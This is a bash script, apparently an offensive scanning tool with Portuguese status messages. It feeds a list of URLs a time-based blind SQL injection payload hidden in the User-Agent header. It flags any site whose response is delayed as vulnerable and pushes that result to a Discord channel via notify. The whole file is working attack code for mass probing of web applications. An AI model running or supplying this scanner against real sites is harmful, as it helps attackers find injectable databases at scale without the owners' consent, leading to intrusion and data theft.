#!/bin/bash
wordlist="$1"

for url in $(cat $wordlist) ;do TIME=$({ time curl --silent -sk -X GET -A "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(2*5),0))OR'" "$url" >/dev/null;}  |&  grep "real" | cut -d "." -f1 | cut -d "m" -f2)

if (( "$TIME" >= "20" )); then
        echo -e "Url  \e[36m${url} \e[0m Status  => \e[32m é VULNERÁVEL A SQLI TIME BASED USER-AGENT\e[0m" | notify -discord-username SQLITIMEBASED
else
        echo -e "Url  \e[36m${url} \e[0m Status  => \e[31m não É VULNERÁVEL A SQLI TIME BASED \e[0m"
fi
done
